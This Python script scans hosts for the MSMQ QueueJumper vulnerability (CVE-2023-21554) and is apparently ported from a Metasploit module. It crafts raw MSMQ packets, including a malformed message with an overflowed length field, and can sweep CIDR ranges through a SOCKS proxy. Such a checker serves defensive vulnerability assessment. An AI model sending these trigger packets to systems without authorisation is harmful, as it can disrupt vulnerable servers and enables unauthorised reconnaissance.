#!/usr/bin/env python3
"""

Standalone scanner for CVE-2023-21554 (msmq_QueueJumper)

Usage examples:
  # Single host
  python3 qjumperchecker.py 192.168.10.100

  # Port + timeout + verbose
  python3 qjumperchecker.py 192.168.10.100 -p 1801 -t 5 -v

  # Targets from file (one IP/host per line) with 20 threads, save JSON
  python3 qjumperchecker.py -f targets.txt -T 20 -o results.json

  # Use a SOCKS5 proxy (e.g., Metasploit's auxiliary/server/socks_proxy listening on 127.0.0.1:1080)
  python3 qjumperchecker.py 10.0.0.5 -x socks5://127.0.0.1:1080
"""

import argparse
import socket
import struct
import sys
import threading
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

# Optional socks support: PySocks (socks)
try:
    import socks
    HAS_SOCKS = True
except Exception:
    HAS_SOCKS = False

# Some defaults matching the MSF module
DEFAULT_RPORT = 1801
DEFAULT_TIMEOUT = 5.0

LOCK = threading.Lock()


def pack_base_header(version_number: int, reserved: int, flags: int,
                     signature: int, packet_size: int, time_to_reach_queue: int) -> bytes:
    # BaseHeader: endian :big for first fields, then packet_size and time_to_reach_queue are little-endian
    # version_number: uint8
    # reserved: uint8
    # flags: uint16 (big)
    # signature: uint32 (big)
    # packet_size: uint32le
    # time_to_reach_queue: uint32le
    part = struct.pack('>BBH', version_number, reserved, flags)    # big-endian for first 4 bytes
    part += struct.pack('>I', signature)                           # big-endian signature
    part += struct.pack('<I', packet_size)                         # little-endian packet_size
    part += struct.pack('<I', time_to_reach_queue)                 # little-endian time_to_reach_queue
    return part


def pack_user_header(source_queue_manager: bytes, queue_manager_address: bytes,
                     time_to_be_received: int, sent_time: int, message_id: int,
                     flags: int, destination_queue: bytes) -> bytes:
    # Follow the Ruby layout:
    # endian :big for strings, but some ints are explicitly little-endian.
    # source_queue_manager (16 bytes)
    # queue_manager_address (16 bytes)
    # time_to_be_received: uint32le
    # sent_time: uint32le
    # message_id: uint32le
    # flags: uint32 (big-endian, per module)
    # destination_queue_length: uint16le
    # destination_queue (raw bytes)
    # padding to 4-byte boundary
    assert len(source_queue_manager) == 16
    assert len(queue_manager_address) == 16
    b = b''
    b += source_queue_manager
    b += queue_manager_address
    b += struct.pack('<I', time_to_be_received)
    b += struct.pack('<I', sent_time)
    b += struct.pack('<I', message_id)
    b += struct.pack('>I', flags)
    dest_len = len(destination_queue)
    b += struct.pack('<H', dest_len)     # uint16le
    b += destination_queue
    # pad to 4 byte boundary
    pad_len = (4 - (len(b) % 4)) % 4
    b += b'\x00' * pad_len
    return b


def pack_message_properties_header(flags: int, label: bytes) -> bytes:
    # Rough translation of the Ruby struct:
    # endian :big
    # uint8 flags
    # uint8 label_length
    # uint16 message_class (big)
    # correlation_id: 20 bytes
    # uint32 body_type (big)
    # uint32 application_tag (big)
    # uint32 message_size (big)
    # uint32 allocation_body_size
    # uint32 privacy_level
    # uint32 hash_algorithm
    # uint32 encryption_algorithm
    # uint32 extension_size
    # label (utf-16le)
    correlation_id = b'\x00' * 20
    message_class = 0
    body_type = 0
    application_tag = 0
    message_size = 0
    allocation_body_size = 0
    privacy_level = 0
    hash_algorithm = 0
    encryption_algorithm = 0
    extension_size = 0

    label_len_chars = len(label) // 2 if len(label) % 2 == 0 else len(label) // 2  # label is utf-16le bytes
    part = b''
    part += struct.pack('>B', flags)
    part += struct.pack('>B', label_len_chars)
    part += struct.pack('>H', message_class)
    part += correlation_id
    # pack many uint32 big-endian (module declared uint32 not le)
    part += struct.pack('>I', body_type)
    part += struct.pack('>I', application_tag)
    part += struct.pack('>I', message_size)
    part += struct.pack('>I', allocation_body_size)
    part += struct.pack('>I', privacy_level)
    part += struct.pack('>I', hash_algorithm)
    part += struct.pack('>I', encryption_algorithm)
    part += struct.pack('>I', extension_size)
    part += label
    return part


def pack_srmp_envelope_header(header_id: int, reserved: int, data: bytes) -> (bytes, int):
    # endian :big for header_id/reserved, but data_length is uint32le
    # uint16 header_id (big)
    # uint16 reserved (big)
    # uint32le data_length
    # data
    # padding to 4-byte boundary
    data_length = len(data) // 2  # in Ruby they set data_length = data.length / 2 (utf-16le char count)
    part = b''
    part += struct.pack('>H', header_id)
    part += struct.pack('>H', reserved)
    part += struct.pack('<I', data_length)   # uint32le
    part += data
    pad_len = (4 - (len(part) % 4)) % 4
    part += b'\x00' * pad_len
    return part, data_length


def pack_compound_message_header(header_id: int, reserved: int,
                                 http_body: bytes, msg_body_size: int, msg_body_offset: int) -> bytes:
    # The Ruby struct:
    # endian :big
    # uint16le :header_id  (note: little-endian)
    # uint16 :reserved (big)
    # uint32le :http_body_size
    # uint32le :msg_body_size
    # uint32le :msg_body_offset
    # string :data (http body, raw)
    part = b''
    part += struct.pack('<H', header_id)   # uint16le
    part += struct.pack('>H', reserved)    # uint16 big
    part += struct.pack('<I', len(http_body))  # http_body_size little-endian
    part += struct.pack('<I', msg_body_size)
    part += struct.pack('<I', msg_body_offset)
    part += http_body
    return part


def pack_extension_header(header_size: int = 12, remaining_headers_size: int = 0, flags: int = 0) -> bytes:
    # endian :big, but fields declared uint32le in Ruby - follow the Ruby declarations
    # uint32le header_size
    # uint32le remaining_headers_size
    # uint8 flags
    # reserved 3 bytes
    part = b''
    part += struct.pack('<I', header_size)
    part += struct.pack('<I', remaining_headers_size)
    part += struct.pack('B', flags)
    part += b'\x00' * 3
    return part


def build_message():
    """
    Build the two messages as the MSF module does:
      - normal message
      - identical message except SRMP data_length += 0x80000000
    Returns:
      (normal_packet_bytes, overflow_packet_bytes)
    """
    # BaseHeader initial placeholders (packet_size will be updated later)
    version_number = 0x10
    reserved = 0
    flags = 768             # PR=3 (Message Priority) -> 768 as in module
    signature = 0x4C494F52  # 'LIOR' ASCII
    packet_size_placeholder = 0
    time_to_reach_queue = 0xFFFFFFFF  # infinite

    # UserHeader fields
    source_queue_manager = b'\x00' * 16
    queue_manager_address = b'\x00' * 16
    time_to_be_received = 0
    sent_time = 1690217059
    message_id = 1
    user_flags = 18620418

    dest_queue_utf16 = "http://192.168.10.100/msmq/private$/queuejumper\x00".encode('utf-16le')
    # MessagePropertiesHeader
    mp_flags = 0
    label_utf16 = "poc\x00".encode('utf-16le')

    # SRMP envelope (contains xml) and is encoded utf-16le
    srmp_xml = ("""
<se:Envelope xmlns:se="http://schemas.xmlsoap.org/soap/envelope/" \r
xmlns="http://schemas.xmlsoap.org/srmp/">\r
<se:Header>\r
 <path xmlns="http://schemas.xmlsoap.org/rp/" se:mustUnderstand="1">\r
   <action>MSMQ:poc</action>\r
   <to>http://192.168.10.100/msmq/private$/queuejumper</to>\r
   <id>uuid:1@00000000-0000-0000-0000-000000000000</id>\r
 </path>\r
 <properties se:mustUnderstand="1">\r
   <expiresAt>20600609T164419</expiresAt>\r
   <sentAt>20230724T164419</sentAt>\r
 </properties>\r
</se:Header>\r
<se:Body></se:Body>\r
</se:Envelope>\r\n\r\n\x00
""").lstrip()
    srmp_data = srmp_xml.encode('utf-16le')

    # Compound message HTTP body (multipart)
    compound_http = ("""
POST /msmq HTTP/1.1\r
Content-Length: 816\r
Content-Type: multipart/related; boundary="MSMQ - SOAP boundary, 53287"; type=text/xml\r
Host: 192.168.10.100\r
SOAPAction: "MSMQMessage"\r
Proxy-Accept: NonInteractiveClient\r
\r
--MSMQ - SOAP boundary, 53287\r
Content-Type: text/xml; charset=UTF-8\r
Content-Length: 606\r
\r
<se:Envelope xmlns:se="http://schemas.xmlsoap.org/soap/envelope/" \r
xmlns="http://schemas.xmlsoap.org/srmp/">\r
<se:Header>\r
 <path xmlns="http://schemas.xmlsoap.org/rp/" se:mustUnderstand="1">\r
   <action>MSMQ:poc</action>\r
   <to>http://192.168.10.100/msmq/private$/queuejumper</to>\r
   <id>uuid:1@00000000-0000-0000-0000-000000000000</id>\r
 </path>\r
 <properties se:mustUnderstand="1">\r
   <expiresAt>20600609T164419</expiresAt>\r
   <sentAt>20230724T164419</sentAt>\r
 </properties>\r
</se:Header>\r
<se:Body></se:Body>\r
</se:Envelope>\r
\r
--MSMQ - SOAP boundary, 53287\r
Content-Type: application/octet-stream\r
Content-Length: 7\r
Content-Id: body@ff3af301-3196-497a-a918-72147c871a13\r
\r
Message\r
--MSMQ - SOAP boundary, 53287--\x00
""").lstrip().encode('utf-8')

    # Pack fields
    user_hdr = pack_user_header(source_queue_manager, queue_manager_address,
                                time_to_be_received, sent_time, message_id,
                                user_flags, dest_queue_utf16)
    mp_hdr = pack_message_properties_header(mp_flags, label_utf16)
    srmp_hdr, data_length_chars = pack_srmp_envelope_header(0, 0, srmp_data)
    # In MSF module they set srmp_envelope_header.data_length = srmp_envelope_header.data.length / 2
    # compound header
    compound_hdr = pack_compound_message_header(500, 0, compound_http, 7, 995)
    extension_hdr = pack_extension_header()

    # Now compute packet_size: base_header.to_binary_s.length + sum of others
    # Base header length is 1+1+2+4 + 4 + 4 = 16 bytes
    base_hdr_len = 16
    total_len = base_hdr_len + len(user_hdr) + len(mp_hdr) + len(srmp_hdr) + len(compound_hdr) + len(extension_hdr)
    base_hdr = pack_base_header(version_number, reserved, flags, signature, total_len, time_to_reach_queue)

    normal_packet = base_hdr + user_hdr + mp_hdr + srmp_hdr + compound_hdr + extension_hdr

    # Create overflowed srmp header: add 0x80000000 to the data_length (as Ruby did)
    overflow_data_length = (data_length_chars + 0x80000000) & 0xFFFFFFFF
    # Rebuild srmp header bytes with overflowed length
    srmp_overflow = b''
    srmp_overflow += struct.pack('>H', 0)   # header_id
    srmp_overflow += struct.pack('>H', 0)   # reserved
    srmp_overflow += struct.pack('<I', overflow_data_length)  # data_length little-endian
    srmp_overflow += srmp_data
    pad_len = (4 - (len(srmp_overflow) % 4)) % 4
    srmp_overflow += b'\x00' * pad_len

    # Recompute base header packet_size for overflow packet (only srmp header size changed)
    total_len_overflow = base_hdr_len + len(user_hdr) + len(mp_hdr) + len(srmp_overflow) + len(compound_hdr) + len(extension_hdr)
    base_hdr_overflow = pack_base_header(version_number, reserved, flags, signature, total_len_overflow, time_to_reach_queue)

    overflow_packet = base_hdr_overflow + user_hdr + mp_hdr + srmp_overflow + compound_hdr + extension_hdr

    return normal_packet, overflow_packet


def connect_send_recv(host, port, payload_bytes, timeout=DEFAULT_TIMEOUT, proxy=None):
    """
    Send bytes to host:port and return the response bytes (or None on timeout/no reply).
    If proxy is provided as 'socks5://host:port', attempts to use PySocks.
    """
    sock = None
    try:
        if proxy:
            if not HAS_SOCKS:
                raise RuntimeError("PySocks library not available. Install with: pip install pysocks")
            # Parse proxy like socks5://host:port or socks5h://host:port
            proto, rest = proxy.split("://", 1) if "://" in proxy else (proxy, '')
            proxy_host, proxy_port = rest.split(':', 1)
            proxy_port = int(proxy_port)
            # only support socks5 for now (socks.SOCKS5)
            if proto.lower().startswith('socks5'):
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
                s.settimeout(timeout)
                s.connect((host, port))
                sock = s
            else:
                raise ValueError("Only socks5 proxy supported in this script (format: socks5://host:port)")
        else:
            s = socket.create_connection((host, port), timeout=timeout)
            s.settimeout(timeout)
            sock = s

        # send full payload
        sock.sendall(payload_bytes)
        # read some data (non-blocking read with timeout)
        try:
            data = sock.recv(4096)
            return data if data else None
        except socket.timeout:
            return None
        finally:
            try:
                sock.close()
            except Exception:
                pass
    except Exception as e:
        # return the exception for higher-level logging
        return e


def check_host(host, port=DEFAULT_RPORT, timeout=DEFAULT_TIMEOUT, proxy=None, verbose=False):
    """
    Performs the two-message check described in the Metasploit module.
    Returns a dict with keys: host, port, status ('unknown'|'no-msmq'|'patched'|'vulnerable'|'error'), info, raw_response
    """
    res = {"host": host, "port": port, "status": "unknown", "info": "", "raw_response": None}
    normal_packet, overflow_packet = build_message()

    if verbose:
        print(f"[+] {host}:{port} - sending initial message (len={len(normal_packet)})")

    r1 = connect_send_recv(host, port, normal_packet, timeout=timeout, proxy=proxy)
    if isinstance(r1, Exception):
        res["status"] = "error"
        res["info"] = f"Connection error: {r1}"
        return res

    if not r1:
        res["status"] = "error"
        res["info"] = "No response received for initial message (timeout?)"
        return res

    # search for ASCII LIOR signature in response
    try:
        if b'LIOR' in r1:
            if verbose:
                print(f"[+] {host}:{port} - MSMQ signature LIOR detected. Continuing to check CVE-2023-21554...")
        else:
            res["status"] = "no-msmq"
            res["info"] = "Service does not look like MSMQ (no LIOR signature)"
            res["raw_response"] = r1.hex()
            return res
    except Exception:
        res["status"] = "unknown"
        res["info"] = "Unexpected response"
        return res

    # Send overflowed message
    if verbose:
        print(f"[+] {host}:{port} - sending malformed overflow message (len={len(overflow_packet)})")
    r2 = connect_send_recv(host, port, overflow_packet, timeout=timeout, proxy=proxy)
    if isinstance(r2, Exception):
        res["status"] = "error"
        res["info"] = f"Connection/IO error: {r2}"
        return res

    if r2 is None:
        # patched behavior: server throws exception and does not reply
        res["status"] = "patched"
        res["info"] = "No response received after malformed packet - MSMQ likely patched (caught overflow)."
        return res

    # If we got a response and it includes LIOR, the module considered it vulnerable
    if b'LIOR' in r2:
        res["status"] = "vulnerable"
        res["info"] = "MSMQ vulnerable to CVE-2023-21554 - QueueJumper (response contains LIOR after malformed packet)."
        res["raw_response"] = r2.hex()
        return res

    # otherwise unknown/unusual behaviour
    res["status"] = "unknown"
    res["info"] = "Unknown response after malformed packet. MSMQ might be vulnerable but behavior is unusual."
    res["raw_response"] = r2.hex()
    return res


def expand_targets_from_cidr_or_file(arg):
    # Accept single host or filename. If file exists, read lines. No CIDR expansion implemented other than simple hosts.
    # For convenience: if argument contains '/', try to expand as CIDR
    targets = []
    import ipaddress
    try:
        if arg.endswith('.txt') or arg.endswith('.list') or '\n' in arg:
            # file path or multi-line; try to open
            with open(arg, 'r') as fh:
                for ln in fh:
                    ln = ln.strip()
                    if ln:
                        targets.append(ln)
            return targets
    except Exception:
        pass
    # If arg looks like a CIDR:
    if '/' in arg:
        try:
            net = ipaddress.ip_network(arg, strict=False)
            for ip in net.hosts():
                targets.append(str(ip))
            return targets
        except Exception:
            pass
    # fallback: single host string
    targets.append(arg)
    return targets


def main():
    p = argparse.ArgumentParser(description="QueueJumper (CVE-2023-21554) MSMQ scanner (translation of MSF auxiliary module).")
    p.add_argument('target', nargs='?', help='Target host, CIDR (e.g. 192.168.1.0/24) or file with hosts (one per line). If omitted, must use -f')
    p.add_argument('-f', '--file', help='File containing targets (one per line). Overrides positional target if provided.')
    p.add_argument('-p', '--port', type=int, default=DEFAULT_RPORT, help=f'Target port (default {DEFAULT_RPORT})')
    p.add_argument('-t', '--timeout', type=float, default=DEFAULT_TIMEOUT, help=f'Socket timeout in seconds (default {DEFAULT_TIMEOUT})')
    p.add_argument('-T', '--threads', type=int, default=10, help='Number of concurrent threads (default 10)')
    p.add_argument('-x', '--proxy', help='Optional proxy in form socks5://host:port (only socks5 supported).')
    p.add_argument('-o', '--output', help='Save results to JSON file')
    p.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    args = p.parse_args()

    targets = []
    if args.file:
        try:
            with open(args.file, 'r') as fh:
                for ln in fh:
                    ln = ln.strip()
                    if ln:
                        targets.append(ln)
        except Exception as e:
            print(f"Failed to open target file: {e}", file=sys.stderr)
            sys.exit(1)
    elif args.target:
        targets = expand_targets_from_cidr_or_file(args.target)
    else:
        p.print_help()
        sys.exit(1)

    if args.proxy and not HAS_SOCKS:
        print("Proxy requested but PySocks is not installed. Install it with: pip install pysocks", file=sys.stderr)
        sys.exit(2)

    results = []
    if args.verbose:
        print(f"[+] Scanning {len(targets)} target(s) with {args.threads} threads...")

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {ex.submit(check_host, t, args.port, args.timeout, args.proxy, args.verbose): t for t in targets}
        for fut in as_completed(futures):
            t = futures[fut]
            try:
                r = fut.result()
            except Exception as e:
                r = {"host": t, "port": args.port, "status": "error", "info": str(e)}
            results.append(r)
            # Print summaries to stdout
            with LOCK:
                status = r.get("status")
                if status == "vulnerable":
                    print(f"[VULN] {r['host']}:{r['port']} - {r['info']}")
                elif status == "patched":
                    print(f"[PATCHED] {r['host']}:{r['port']} - {r['info']}")
                elif status == "no-msmq":
                    if args.verbose:
                        print(f"[NO-MSMQ] {r['host']}:{r['port']} - {r['info']}")
                elif status == "error":
                    print(f"[ERROR] {r['host']}:{r['port']} - {r['info']}")
                else:
                    if args.verbose:
                        print(f"[INFO] {r['host']}:{r['port']} - {r['info']}")

    if args.output:
        try:
            with open(args.output, 'w') as fh:
                json.dump(results, fh, indent=2)
            if args.verbose:
                print(f"[+] Results saved to {args.output}")
        except Exception as e:
            print(f"Failed to save results: {e}", file=sys.stderr)

    # Print a short machine-readable summary
    vulns = [r for r in results if r.get("status") == "vulnerable"]
    print(f"\nScan complete. Targets scanned: {len(results)}. Vulnerable: {len(vulns)}.")
    if len(vulns) > 0:
        for v in vulns:
            print(f"  - {v['host']}:{v['port']}")


if __name__ == '__main__':
    print(r"""
       █▓▒░ qjumperchecker ░▒▓█
    ▄████▄   ▄████▄   ▄████▄   ▄████▄   ▄████▄ 
   ███▀▀███  ███▀▀███ ███▀▀███ ███▀▀███ ███▀▀███
   ███   ███ ███   ███ ███   ███ ███   ███ ███   ███
   ███   ███ ███   ███ ███   ███ ███   ███ ███   ███
   ███   ███ ███   ███ ███   ███ ███   ███ ███   ███
   ▀█████▀   ▀█████▀   ▀█████▀   ▀█████▀   ▀█████▀ 
             by Mr. Robot.txt
    """)
    main()
